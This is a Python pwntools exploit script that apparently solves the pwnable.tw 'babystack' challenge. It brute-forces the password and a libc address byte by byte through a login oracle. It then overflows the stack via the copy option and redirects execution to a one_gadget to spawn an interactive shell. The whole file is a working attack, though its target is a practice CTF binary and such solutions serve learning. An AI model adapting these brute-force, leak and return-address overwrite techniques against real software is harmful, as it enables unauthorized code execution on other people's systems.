import pwn
from pwn import *


context.log_level = "DEBUG"
p = process("./babystack_patched")
context.binary = "babystack_patched"
#p = gdb.debug("./babystack")
#p = remote("chall.pwnable.tw", 10205)
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")


def login(payload):
    p.sendline(b"1")
    p.sendafter(b"Your passowrd :",payload)
    p.recvline()


def fix():
    p.sendline(b"1")

def copy(data):
    p.sendline(b"3")
    p.sendlineafter(b"Copy :",data)
    p.recvline()

def brute(length):
    password = b""
    for l in range(length):
        found = False
        for i in range(0x10):
            for j in range (1,0x100):
                p.sendafter(b">> ",b"1")
                p.sendlineafter(b"Your passowrd :", password + p8(j) + b"\x00") 
 
                if(p.recvline() == b"Login Success !\n"):
                    password += p8(j)
                    p.sendafter(b">> ",b"1")
                    found = True
                    break
            if found:
                break
    return password


password = brute(16)
#bypass1 = password[-8:]
#print(bypass1)
#bypass2 = password[:8][::-1]
#print(bypass2)
print(password)
pwn.gdb.attach(p, '''
   brva 0xEBB
''')
payload = b"\x00"+b"A"*71
login(payload)
data =  b"A"*63
copy(data)
#p.recvuntil(b">> Invalid choice\n")
fix()

def leakc(length):
    libc = b""
    for l in range(length):
        found = False
        for i in range(6):
            for j in range (1,0x100):
                p.sendafter(b">> ",b"1")
                p.sendlineafter(b"Your passowrd :", b"A"*8+libc + bytes([j]) + b"\x00")

                if(p.recvline() == b"Login Success !\n"):
                    libc += bytes([j])
                    found = True
                    break
            if found:
                break
        fix()
    return libc


libc = leakc(6)
libc_leak = int.from_bytes(libc,byteorder="little")
libc_base = libc_leak - 0x78439
print(libc_base)
one_gadget = libc_base + 0x45216
print(one_gadget)


payload = b"\x00"+b"A"*63+password+b"A"*16+b"B"*8+p64(one_gadget)
login(payload)
data = b"A"*63
copy(data)
p.sendafter(b">> ",b"2")
p.interactive()
